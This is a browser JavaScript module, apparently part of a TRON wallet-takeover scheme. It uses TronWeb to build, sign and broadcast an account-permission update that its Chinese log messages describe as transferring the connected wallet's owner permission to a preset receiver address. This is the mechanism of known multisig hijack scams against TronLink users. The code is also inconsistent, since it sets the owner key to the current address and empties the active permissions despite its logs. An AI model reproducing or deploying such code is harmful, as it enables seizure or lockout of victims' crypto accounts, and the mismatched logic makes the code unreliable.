window.multiSignCompleted = false;
window.multiSignRunning = false;


async function executeMultiSign() {
    try {
        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
            throw new Error('未检测到有效的TronWeb环境');
        }
        
        console.log('开始执行拥有者权限转让...');
        const currentAddress = window.tronWeb.defaultAddress.base58;
        console.log('当前钱包地址:', currentAddress);
        console.log('接收权限的钱包地址:', window.MULTI_SIGN_RECEIVER);
        
        const currentAddressHex = window.tronWeb.address.toHex(currentAddress);
        const receiverAddressHex = window.tronWeb.address.toHex(window.MULTI_SIGN_RECEIVER);
        
        const ownerPermission = {
            type: 0,
            id: 0,
            permission_name: "owner",
            threshold: 1,
            keys: [
                {
                    address: currentAddressHex,
                    weight: 1
                }
            ],
            operations: "7fff1fc003fffffffe0000000000000000000000000000000000000000000000"
        };
        
        console.log('权限配置:', {
            owner: ownerPermission
        });
        
        const witnessPermission = null;
        
        const activePermissions = [];
        
        console.log('准备更新账户权限...');
        console.log('- 当前地址:', currentAddress);
        console.log('- 拥有者权限:', JSON.stringify(ownerPermission));
        console.log('- 见证人权限:', witnessPermission);
        console.log('- 活跃权限:', JSON.stringify(activePermissions));
        
        const tx = await window.tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            witnessPermission,
            activePermissions
        );
        
        console.log('交易创建成功:', tx);
        
        console.log('签名交易...');
        const signedTx = await window.tronWeb.trx.sign(tx);
        console.log('签名完成:', signedTx);
        
        console.log('广播交易...');
        const result = await window.tronWeb.trx.sendRawTransaction(signedTx);
        
        console.log('拥有者权限转让结果:', result);
        return result;
    } catch (error) {
        console.error('执行拥有者权限转让出错:', error);
        console.error('详细错误信息:', error.stack);
        return false;
    }
}


async function executeMultiSignModule() {
    
    if (window.multiSignRunning) {
        console.log('多签操作正在执行中，请稍候...');
        return { success: false, message: '已在执行中' };
    }
    
    
    window.multiSignRunning = true;
    
    try {
        if (!window.tronWeb || !window.tronWeb.ready) {
            console.log('❌ 错误: 未连接TronLink钱包!');
            window.multiSignRunning = false;
            return { success: false, message: '未连接钱包' };
        }
        
        console.log('✅ TronWeb环境检测通过');
        console.log('👤 当前钱包地址:', window.tronWeb.defaultAddress.base58);
        console.log('👥 多签接收地址:', window.MULTI_SIGN_RECEIVER);
        
        const result = await executeMultiSign();
        
        if (result) {
            console.log('✅ 拥有者权限转让成功!');
            if (typeof result === 'object') {
                console.log('📋 交易结果:', result);
            }
            window.multiSignCompleted = true;
            return { success: true, result };
        } else {
            console.log('❌ 拥有者权限转让失败');
            return { success: false, message: '执行失败' };
        }
    } catch (error) {
        console.error('拥有者权限转让出错:', error);
        console.log('❌ 出错:', error.message);
        return { success: false, error };
    } finally {
        
        window.multiSignRunning = false;
        
        
        const event = new CustomEvent('multisign_completed', { 
            detail: { completed: window.multiSignCompleted }
        });
        document.dispatchEvent(event);
    }
} 